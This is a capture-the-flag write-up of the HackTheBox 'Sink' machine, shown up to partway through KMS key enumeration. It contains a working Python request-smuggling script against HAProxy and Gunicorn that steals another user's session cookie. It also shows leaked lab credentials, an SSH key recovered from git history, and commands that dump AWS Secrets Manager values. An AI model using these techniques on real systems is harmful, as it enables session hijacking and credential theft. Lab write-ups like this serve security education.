---
title: HTB: Sink
url: https://0xdf.gitlab.io/2021/09/18/htb-sink.html
date: 2021-09-18T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: htb-sink, hackthebox, ctf, nmap, gitea, haproxy, gunicorn, request-smuggling, localstack, aws, aws-secretsmanager, aws-kms, iptables, htb-bucket, htb-gobox, git, oswe-like
---

![Sink](https://0xdfimages.gitlab.io/img/sink-cover.png)

Sink was an amazing box touching on two major exploitation concepts. First is the request smuggling attack, where I send a malformed packet that tricks the front-end server and back-end server interactions such that the next user’s request is handled as a continuation of my request. After that, I’ll find a AWS instance (localstack) and exploit various services in that, including secrets manager and the key management. In Beyond Root, I’ll look at the way this box was configured to allow for multiple users to do request smuggling at the same time.

## Box Info

| Name | [Sink](https://hackthebox.com/machines/sink)  [Sink](https://hackthebox.com/machines/sink) [Play on HackTheBox](https://hackthebox.com/machines/sink) |
| --- | --- |
| Release Date | [30 Jan 2021](https://twitter.com/hackthebox_eu/status/1354447126240092162) |
| Retire Date | 18 Sep 2021 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Sink |
| Radar Graph | Radar chart for Sink |
| First Blood User | 02:22:06[Tartofraise Tartofraise](https://app.hackthebox.com/users/103958) |
| First Blood Root | 05:18:01[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22) and HTTP (3000 and 5000):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.225
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 14:49 EDT
Nmap scan report for 10.10.10.225
Host is up (0.062s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 107.46 seconds

oxdf@parrot$ nmap -p 22,3000,5000 -sV -sC -Oa scans/nmap-tcpscripts 10.10.10.225             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 14:46 EDT
Nmap scan report for 10.10.10.225
Host is up (0.022s latency).    

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=4f60e64fb9fa73b5; Path=/; HttpOnly
|     Set-Cookie: _csrf=W0Ju4WvH_4TM4TmmbTAV6LeQUNE6MTYxMTMyNDcxNTkxMzU1MTUyMg; Path=/; Expires=Sat, 23 Jan 2021 14:11:55 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 22 Jan 2021 14:11:55 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=512dddee59218921; Path=/; HttpOnly
|     Set-Cookie: _csrf=33nFQ5nHOOIueIYdDtPk9qzm9Ww6MTYxMTMyNDcyMTk1NDMyMDc0MA; Path=/; Expires=Sat, 23 Jan 2021 14:12:01 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 22 Jan 2021 14:12:01 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
5000/tcp open  http    Gunicorn 20.0.0
|_http-server-header: gunicorn/20.0.0
|_http-title: Sink Devops
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=1/22%Time=600ADD2B%P=x86_64-pc-linux-gnu%r(Ge
...[snip]...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.97 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu Focal 20.04.

### Gitea - TCP 3000

Port 3000 is hosting an instance of [Gitea](https://gitea.io/en-us/), a self hosted Git service.

![image-20210122093135169](https://0xdfimages.gitlab.io/img/image-20210122093135169.png)

In the explore tab, I don’t see any repositories, but there are three users:

![image-20210122093243599](https://0xdfimages.gitlab.io/img/image-20210122093243599.png)

There’s also an organization:

![image-20210122093259295](https://0xdfimages.gitlab.io/img/image-20210122093259295.png)

Those are all worth noting, but there’s not much else I can do here without creds to login.

The response headers don’t give away much information. `searchsploit` did have an exploit for Gitea 1.4.0, but the page indicates this is 1.14.12.

### HTTP - TCP 5000

#### Site

The site at the root of port 5000 is a login page:

![image-20210122093558592](https://0xdfimages.gitlab.io/img/image-20210122093558592.png)

The link to Sign Up allows me to create an account, and then takes me to the Sink Devops page:

![image-20210122093649162](https://0xdfimages.gitlab.io/img/image-20210122093649162.png)

I am able to leave a comment at the bottom of the only post:

![image-20210122093823922](https://0xdfimages.gitlab.io/img/image-20210122093823922.png)

I can also delete it.

The Contact link along the top just points to `/home`, but the Notes link leads to `/notes`:

![image-20210122093936127](https://0xdfimages.gitlab.io/img/image-20210122093936127.png)

I can create notes, view, and delete them:

![image-20210122094031342](https://0xdfimages.gitlab.io/img/image-20210122094031342.png)

#### Stack

Looking at the response headers, there are two interesting ones that stand out:

```

HTTP/1.1 200 OK
Server: gunicorn/20.0.0
Date: Fri, 22 Jan 2021 14:39:01 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 4029
Vary: Cookie
Via: haproxy
X-Served-By: 5ce653e85303

```

The server is [Gunicorn](https://gunicorn.org/), which is commonly used to scale Python web applications. The `Via` header also shows [haproxy](http://www.haproxy.org/). It is not uncommon to have something like HAProxy doing load balancing in front of multiple servers, and then Gunicorn managing access to the web application on each server. [This post](https://stackoverflow.com/questions/13210636/differentiate-nginx-haproxy-varnish-and-uwsgi-gunicorn) does a really nice job breaking down how different technologies fit together.

I’ll send one of the requests over to repeater in Burp and make a malformed request:

```

GET /notes HTTP/1.1
Host: 10.10.10.225:5000
User

```

On sending this, the HAProxy response gives the version:

```

HTTP/1.0 400 Bad request
Server: haproxy 1.9.10
Cache-Control: no-cache
Connection: close
Content-Type: text/html

<html><body><h1>400 Bad request</h1>
Your browser sent an invalid request.
</body></html>

```

#### Exploits

`searchsploit` didn’t return anything interesting for Gunicorn or HAProxy. Googling, I came across [CVE-2020-11100](https://bugs.chromium.org/p/project-zero/issues/detail?id=2023), RCE in HAProxy using HTTP2, but I had a hard time finding a POC that would work here, and the bug looks very complicated.

Google also returned a blog post entitled [HAProxy HTTP request smuggling (CVE-2019-18277)](https://nathandavison.com/blog/haproxy-http-request-smuggling). It’s looking at how HAProxy and Gunicorn handle the `Transfer-Encoding` header. [This issue](https://github.com/benoitc/gunicorn/issues/2176) is where the Gunicorn development team is talking about fixing this issue, with a post on [20 Nov 2019](https://github.com/benoitc/gunicorn/issues/2176#issuecomment-556385956) saying it’s been fixed. In the [Gunicorn change-log](https://github.com/benoitc/gunicorn/releases/tag/20.0.2), it shows the issue fixed in 20.0.1. Given that Sink is using 20.0.0, this attack should work.

### Request SmugglinBackground

This [PortSwigger Article](https://portswigger.net/web-security/request-smuggling) does a really good job showing how HTTP Request Smuggling works. At a high level, this attack takes advantage of a case where the front-end and back-end servers break a request differently. There are two ways to delineate an HTTP request body - the `Content-Length` and the `Transfer-Encoding` headers. The `Content-Length` header gives the length of the body in bytes. `Transfer-Encoding: chunked` says that the body is broken into one or more chunks, where a chunk starts with a hex number representing the size of the chunk, then the chunk data, and the body is terminated with a chunk of size 0.

When the front-end (like HAProxy) sends data to the back-end (like Gunicorn), it can end up in one stream, leaving the back-end to break it apart based on these headers (image from PortSwigger):

![image-20210914141059779](https://0xdfimages.gitlab.io/img/image-20210914141059779.png)

If an attacker can make the two break requests in different places, they can get their information into someone else’s request (image from PortSwigger):

![image-20210914141115546](https://0xdfimages.gitlab.io/img/image-20210914141115546.png)

## Shell as marcus

### Leak Admin Cookie via Smuggling

#### Smuggling Strategy

I’m going to craft a request that will be sent on completely by the front end, but broken into a complete request and an incomplete request by the back-end, much like the image above. The next request in will end up being the completion of my incomplete request.

The issue with this specific CVE is in how HAProxy handles the 0x0b character, which is vertical tab. When I put `Transfer-Encoding: \x0bchunked`, HAProxy will see that as:

```

Transfer-Encoding:
                   chunked

```

Since they are on different lines, it will ignore this, and fall back to using the `Content-Length` header.

When the request reached GUnicorn, it will ignore the \x0b, and handle the request as [chunked](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding). This encoding method ignores the `Content-Length` and looks at chunks, where each chunk starts with a line with just the chunk length, and then the last chunk (or “terminating chunk”) is length 0.

For Sink, I will start with a simple GET and then the second partial request will be the headers for a POST request to create a note, and I’ll stop where the POST body content would start, including the `note=`. That will put the next request (up to the `Content-Length`) into the body of the POST, and create a note with it. As my account cookies are in the partial payload, the note will be created in my account. Hopefully I can see other user’s activity and perhaps even their cookies.

I want to send a request that looks like this:

```

GET / HTTP/1.1
Host: 127.0.0.1:5000
Content-Length: 230
Transfer-Encoding:\x0bchunked

0

POST /notes HTTP/1.1
Host: 127.0.0.1:5000
Referer: http://10.10.10.42:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=

```

`Content-Length: 230` is the length of entire body, including second request. HAProxy will send this one as one request based on the `Content-Length` header. Gunicorn will break it based on the `chunked` encoding, returning the `/` page to me. `Content-Length: 50` is much longer than the body I’m providing, so Gunicorn will wait for more to complete the request. I don’t want it to be too long at the start, as I want to make sure the next request completes it.

#### Smuggling HTTP Request

I’ll write a Python script to generate this packet. I can’t use `requests` or modules that create well-formed HTTP requests, so I’ll use `socket`. First, I’ll point it back at myself to see how the request looks:

```

#!/usr/bin/env python3

import socket

host = "127.0.0.1"
port = 5000

body = f"""0

POST /notes HTTP/1.1
Host: {host}:{port}
Referer: http://10.10.10.225:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=""".replace('\n','\r\n')

header = f"""GET / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Transfer-Encoding: \x0bchunked

""".replace('\n','\r\n')

request = (header + body).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)

```

Sending this to myself with `nc` listening, I can see the request:

```

oxdf@parrot$ nc -lnp 5000 
GET / HTTP/1.1
Host: 127.0.0.1:5000
Content-Length: 230
Transfer-Encoding: 
                   chunked

0

POST /notes HTTP/1.1
Host: 127.0.0.1:5000
Referer: http://10.10.10.225:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=

```

It looks good! It’s important to note that I’m giving the second request a valid session cookie so that the results show up under my notes.

#### Send Smuggle

Now I’ll change the host from `localhost` to `10.10.10.225`, and give it a run. I also found it was much more reliable if I put a `time.sleep(5)` in before the socket closes. After the script completes, I’ll refresh the page to see if any note show up, and there’s a new one:

![image-20210122114119086](https://0xdfimages.gitlab.io/img/image-20210122114119086.png)

The contents look like the start of another request, where someone is trying to hit the `/notes/delete/1234` endpoint, and based on the partial hosts header, it looks like it’s coming from Sink:

![image-20210122114245177](https://0xdfimages.gitlab.io/img/image-20210122114245177.png)

I’ll expand the `Content-Length` header from 50 to 300 and see if I can capture more of a request. It works:

![image-20210122114825995](https://0xdfimages.gitlab.io/img/image-20210122114825995.png)

Now I’ve got this users JWT. Over on [jwt.io](https://jwt.io/), it decodes to:

![image-20210122115605799](https://0xdfimages.gitlab.io/img/image-20210122115605799.png)

### Gitea root Access

I’ll use the Firefox dev console to change my cookie to the admin’s cookie, and then refresh the `/notes` page:

![image-20210122115721527](https://0xdfimages.gitlab.io/img/image-20210122115721527.png)

Those three notes each contain creds:

| ID | Content |
| --- | --- |
| 1 | Chef Login : http://chef.sink.htb Username : chefadm Password : /6’fEGC&zEx{4]zz |
| 2 | Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3 |
| 3 | Nagios URL : https://nagios.sink.htb Username : nagios\_adm Password : g8<H6GK{\*L.fB3C |

The creds from note 2 work to log into Gitea back on port 5000:

[![image-20210122122005106](https://0xdfimages.gitlab.io/img/image-20210122122005106.png)](https://0xdfimages.gitlab.io/img/image-20210122122005106.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210122122005106.png)

### Find SSH Key

Looking around, the repository Key\_Management jumped out as potentially interesting. I clicked on that, and then on Commits to see details on the nine commits:

![image-20210122122119226](https://0xdfimages.gitlab.io/img/image-20210122122119226.png)

I clicked through each of the commits, and the third commit (starting from the top at the most recent), Preparing for Prod, shows the deletion of a SSH private key by marcus:

![image-20210122122701716](https://0xdfimages.gitlab.io/img/image-20210122122701716.png)

A bit more digging shows that this key was added by marcus in the Adding EC2 Key Management Structure commit, the commit before this was removed.

### SSH Access

The SSH private key works to get access to the box as marcus:

```

oxdf@parrot$ ssh -i ~/keys/sink_marcus_key marcus@10.10.10.225
...[snip]...
Last login: Mon Jan  4 10:29:50 2021 from 10.10.14.2
marcus@sink:~$ 

```

And I can grab `user.txt`:

```

marcus@sink:~$ cat user.txt
8ba26b1e************************

```

## Shell as david

### Local Enumeration

Other than `user.txt`, there’s not much in marcus’ homedir. Looking at the process list (`ps auxww --forest`), it’s clear that there are docker containers running. Under `containerd`, this looks to be the container running the web stuff, including HAProxy and Gunicorn:

```

root         954  0.1  1.0 1116848 22272 ?       Ssl  Jan04  35:45 /usr/bin/containerd
root        2119  0.0  0.1 110108  3020 ?        Sl   Jan04   2:38  \_ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/5ce653e853034dac6db2ed480e0721374f93d7ecf568f01746f42d2e40fdfdc4 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root        2306  0.0  0.1  63508  4008 ?        Ss   Jan04  13:43  |   \_ /usr/bin/python /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf                                                                                 
root        2462  0.0  1.0 106312 21736 ?        S    Jan04   4:10  |       \_ /usr/bin/python3 /usr/local/bin/gunicorn --config=/etc/gunicorn.conf.py app:app                                                                             
david       2474  0.2  1.5 133964 32112 ?        S    Jan04  75:42  |       |   \_ /usr/bin/python3 /usr/local/bin/gunicorn --config=/etc/gunicorn.conf.py app:app                                                                         
systemd+    2463  0.0  0.1  28124  2284 ?        S    Jan04  12:01  |       \_ /home/haproxy/haproxy -f /home/haproxy/haproxy.cfg
marcus      2464  0.2  0.8  63908 17888 ?        S    Jan04  76:44  |       \_ python3 /home/bot/bot.py

```

And this one (also under `containerd`) looks like a different container that I don’t know about yet:

```

root       14792  0.0  0.0 108700  1632 ?        Sl   Jan04   0:54  \_ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/28501ba00f4c4ea26dca6c7b0d13205c559376ae39c8488261e337021d03c6ab -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root       14809  0.0  0.0   2232     4 ?        Ss   Jan04   0:00      \_ /bin/bash /usr/local/bin/docker-entrypoint.sh
root       14868  0.0  0.0  21848  1044 ?        S    Jan04   6:46          \_ /usr/bin/python3.8 /usr/bin/supervisord -c /etc/supervisord.conf
root       14877  0.0  0.0   1160     4 ?        S    Jan04   0:00          |   \_ make infra                        
root       14878  0.1  4.0 128128 82968 ?        Sl   Jan04  42:41          |       \_ python bin/localstack start --host
root       14904  0.0  0.1 714668  2560 ?        Ssl  Jan04   2:50          |           \_ /opt/code/localstack/localstack/infra/kms/local-kms.alpine.bin
root       14870  0.0  0.0   1568     0 ?        S    Jan04   2:28          \_ tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err

```

There are two `docker-proxy` instances running:

```

root        1438  0.0  1.2 1082996 25256 ?       Ssl  Jan04  10:30 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        2055  0.0  0.0 548504  1852 ?        Sl   Jan04   0:01  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.17.0.2 -container-port 8080                                                     
root       14785  0.0  0.0 623772  1908 ?        Sl   Jan04   1:09  \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.18.0.2 -container-port 4566

```

The first is forwarding port 5000 to port 8080 on the container, and listening on all interfaces. That fits with the web stuff I’ve already seen.

The other one is only listening on localhost, and connecting to 4566 on the container.

The second container is also running `bin/localstack`. Googling for that finds [LocalStack](https://github.com/localstack/localstack), “A fully functional local AWS cloud stack”.

> LocalStack spins up the following core Cloud APIs on your local machine.
>
> **Note:** Starting with version `0.11.0`, all APIs are exposed via a single *edge service*, which is accessible on **http://localhost:4566/** by default (customizable via `EDGE_PORT`, see further below).

I first did an overview of AWS cloud exploitation with [Bucket](/2021/04/24/htb-bucket.html#aws-overview), and I’ve since also targeted it in [Gobox](/2021/08/30/htb-gobox.html#aws).

Typing `aws[tab][tab]` in the shell shows the various AWS binaries on Sink:

```

marcus@sink:/home$ aws
aws                   aws_bash_completer    aws.cmd               aws_completer         awslocal              awslocal.bat          aws_zsh_completer.sh 

```

The `awslocal` is the same as `aws`, but it always talks to localhost, so I don’t have to give it a `--endpoint-url` parameter with each command. The command is run with the syntax `awslocal [options] <command> <subcommand> [<subcommand> ...] [parameters]`, and there are over 200 unique commands. I need more focus as to what to target.

### Git Enumeration

Back in the Gitea instance, I looked through the three active repos. The Kinesis\_ElasticSearch repo seemed to have some interaction with Lambda, the AWS serverless functions offering. The Serverless-Plugin repo defines a Docker instance that connects to localstack, but I didn’t see any clues in there.

The Key\_Management repo (where I found the SSH key) has more to offer, and I’ll come back to that.

The Log\_Management repo has a `create_logs.php` script:

```

    <?php
    require 'vendor/autoload.php';

    use Aws\CloudWatchLogs\CloudWatchLogsClient;
    use Aws\Exception\AwsException;

    $client = new CloudWatchLogsClient([
    	'region' => 'eu',
    	'endpoint' => 'http://127.0.0.1:4566',
    	'credentials' => [
    		'key' => '<ACCESS_KEY_ID>',
    		'secret' => '<SECRET_KEY>'
    	],
    	'version' => 'latest'
    ]);
    try {
    $client->createLogGroup(array(
    	'logGroupName' => 'Chef_Events',
    ));
    }
    catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }
    try {
    $client->createLogStream([
    	'logGroupName' => 'Chef_Events',
    	'logStreamName' => '20201120'
    ]);
    }catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }
    ?>

```

Looking at the history, the original version has the `key` and `secret`:

```

		'key' => 'AKIAIUEN3QWCPSTEITJQ',
		'secret' => 'paVI8VgTWkPI3jDNkdzUMvK4CcdXO2T7sePX0ddF'

```

### AWS Enumeration

My first instinct was to look at the `cloudwatch` and `lambda` commands. For example, `awslocal lambda help` gives a man page with the list of sub-commands. `list-functions` seemed like a good one, but it looks like that endpoint is not enabled:

```

marcus@sink:/home$ awslocal lambda list-functions

An error occurred (400) when calling the ListFunctions operation:

```

The `cloudwatch` command seemed to have a functioning endpoint, but I couldn’t get anything to return data:

```

marcus@sink:/home$ awslocal cloudwatch describe-insight-rules

Unable to parse response (not well-formed (invalid token): line 1, column 0), invalid XML received. Further retries may succeed:
b'{}'

marcus@sink:/home$ awslocal cloudwatch list-dashboards

Unable to parse response (not well-formed (invalid token): line 1, column 0), invalid XML received. Further retries may succeed:
b'{}'

```

In playing around with other commands, the `log` command had a bunch of interesting subcommands. `describe-desinations` failed, but `describe-log-groups` returned data:

```

marcus@sink:/home$ awslocal logs describe-log-groups
{
    "logGroups": [
        {
            "logGroupName": "cloudtrail",
            "creationTime": 1611344042023,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:us-east-1:000000000000:log-group:cloudtrail",
            "storedBytes": 91
        }
    ]
}

```

I next tried `describe-log-streams`, and it returns an error, saying it requires the parameter `--log-group-name`. I’ve got one of those from the previous query:

```

marcus@sink:/home$ awslocal logs describe-log-streams --log-group-name cloudtrail
{
    "logStreams": [
        {
            "logStreamName": "20201222",
            "creationTime": 1611344161523,
            "firstEventTimestamp": 1126190184356,
            "lastEventTimestamp": 1533190184356,
            "lastIngestionTime": 1611344161544,
            "uploadSequenceToken": "1",
            "arn": "arn:aws:logs:us-east-1:26467:log-group:cloudtrail:log-stream:20201222",
            "storedBytes": 91
        }
    ]
}

```

`describe-queries`, `describe-query-definitions`, and `describe-resource-policies` all returned 500. `describe-subscription-filters` requires a `--log-group-name`, and on giving it, it returned that there are none.

`get-log-events` requires both a `--log-group-name` and a `--log-stream-name`. At this point, I only have one of each, and it returns a handful of events:

```

marcus@sink:/home$ awslocal logs get-log-events --log-group-name cloudtrail --log-stream-name 20201222
{
    "events": [
        {
            "timestamp": 1126190184356,
            "message": "RotateSecret",
            "ingestionTime": 1611344401544
        },
        {
            "timestamp": 1244190184360,
            "message": "TagResource",
            "ingestionTime": 1611344401544
        },
        {
            "timestamp": 1412190184358,
            "message": "PutResourcePolicy",
            "ingestionTime": 1611344401544
        },
        {
            "timestamp": 1433190184356,
            "message": "AssumeRole",
            "ingestionTime": 1611344401544
        },
        {
            "timestamp": 1433190184358,
            "message": "PutScalingPolicy",
            "ingestionTime": 1611344401544
        },
        {
            "timestamp": 1433190184360,
            "message": "RotateSecret",
            "ingestionTime": 1611344401544
        },
        {
            "timestamp": 1533190184356,
            "message": "RestoreSecret",
            "ingestionTime": 1611344401544
        }
    ],
    "nextForwardToken": "f/00000000000000000000000000000000000000000000000000000006",
    "nextBackwardToken": "b/00000000000000000000000000000000000000000000000000000000"
}

```

I continued working through the `logs` subcommands, but didn’t find anything else useful.

### Secrets Manager

The logs themselves have multiple references to secrets, and there’s one reference in the help page:

```

marcus@sink:/home$ awslocal help | grep -i secret
       o secretsmanager

```

Running `awslocal secretsmanager help` gives a list of the commands. `list-secrets` jumps out as interesting.

```

marcus@sink:/home$ awslocal secretsmanager list-secrets
{            
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-NZsTy",
            "Name": "Jenkins Login",
            "Description": "Master Server to manage release cycle 1",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "9dc3eaf2-f7c1-4ed5-a565-e4cc66d2d662": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-lqgyE",
            "Name": "Sink Panel",
            "Description": "A panel to manage the resources in the devnode",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "cebb4b7c-de44-4fb5-8657-70fe8d4196d5": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-jCkwP",
            "Name": "Jira Support",
            "Description": "Manage customer issues",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",   
            "RotationRules": {                           
                "AutomaticallyAfterDays": 0
            },   
            "Tags": [],
            "SecretVersionsToStages": {
                "d8bafda3-4129-4519-8989-39a0094126d2": [
                    "AWSCURRENT"                                                                                     
                ]                  
            }                                       
        }                  
    ]                                
} 

```

I wasn’t sure what to do with these, but back in the help, there’s another command, `get-secret-value`. Running it reports that it requires `--secret-id`. I didn’t see ids in the output above, but looking at `awslocal secretsmanager get-secret-value help`, it clarifies what is needed:

> ```

>    --secret-id (string)
>       Specifies  the  secret  containing  the version that you want to re-
>       trieve. You can specify either the Amazon Resource Name (ARN) or the
>       friendly name of the secret.
>
> ```

It works!

```

marcus@sink:/home$ awslocal secretsmanager get-secret-value --secret-id 'Jenkins Login'
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-NZsTy",
    "Name": "Jenkins Login",
    "VersionId": "9dc3eaf2-f7c1-4ed5-a565-e4cc66d2d662",
    "SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~8j\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1609756145
}

```

Grab the other two as well:

```

marcus@sink:/home$ awslocal secretsmanager get-secret-value --secret-id 'Sink Panel'
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-lqgyE",
    "Name": "Sink Panel",
    "VersionId": "cebb4b7c-de44-4fb5-8657-70fe8d4196d5",
    "SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1609756145
}
marcus@sink:/home$ awslocal secretsmanager get-secret-value --secret-id 'Jira Support'
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-jCkwP",
    "Name": "Jira Support",
    "VersionId": "d8bafda3-4129-4519-8989-39a0094126d2",
    "SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EALB=bcC=`a7f2#k\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1609756146
}

```

### su

Given that the last set of creds in the secrets manager is for david@sink.htb, and david is a user on the host, it’s worth checking to see if they work for that account. They do:

```

marcus@sink:/home$ su david -
Password: 
david@sink:/home$ 

```

## Shell as root

### Homedir Enumeration

david’s homedir has a `Projects` directory with only one file in it:

```

david@sink:~$ find Projects/ -type f -ls
   393219      4 -rw-r--r--   1 david    david         512 Jan 22 19:58 Projects/Prod_Deployment/servers.enc

```

Neither `file` nor `xxd` offer much of a hint as to what it is:

```

david@sink:~$ file Projects/Prod_Deployment/servers.enc
Projects/Prod_Deployment/servers.enc: data
david@sink:~$ xxd Projects/Prod_Deployment/servers.enc
00000000: b0b5 1d13 c8a3 0178 8acd 6ab1 2478 a4f4  .......x..j.$x..
00000010: 3173 cd15 953f b96b ccd1 abf4 5e50 a542  1s...?.k....^P.B
00000020: c808 6c41 6423 4c2e 4239 7541 66d8 e610  ..lAd#L.B9uAf...
00000030: a5e6 b64c cb8e f65a 2d34 8000 9ef9 2563  ...L...Z-4....%c
...[snip]...

```

### Key\_Management Enumeration

The Key\_Management repo in Gitea has a handful of scripts. For example, `listkeys.php`:

```

    <?php
    require 'vendor/autoload.php';

    use Aws\Kms\KmsClient;
    use Aws\Exception\AwsException;

    $KmsClient = new Aws\Kms\KmsClient([
        'profile' => 'default',
        'version' => '2020-12-21',
        'region' => 'eu',
        'endpoint' => 'http://127.0.0.1:4566'
    ]);

    $limit = 100;

    try {
        $result = $KmsClient->listKeys([
            'Limit' => $limit,
        ]);
        var_dump($result);
    } catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }

```

Just like the other stuff involving logs, this one is interacting with localstack on TCP 4566, and it’s using the [Amazon Key Management System](https://aws.amazon.com/kms/), or KMS. `awslocal` has a `kms` command:

```

david@sink:~$ awslocal help | grep -i kms
       o kms

```

The subcommands include `list-keys` which seems like a good starting place. 11 keys come back:

```

david@sink:~$ awslocal kms list-keys
{
    "Keys": [
        {
            "KeyId": "0b539917-5eff-45b2-9fa1-e13f0d2c42ac",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac"
        },
        {
            "KeyId": "16754494-4333-4f77-ad4c-d0b73d799939",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939"
        },
        {
            "KeyId": "2378914f-ea22-47af-8b0c-8252ef09cd5f",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f"
        },
        {
            "KeyId": "2bf9c582-eed7-482f-bfb6-2e4e7eb88b78",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"
        },
        {
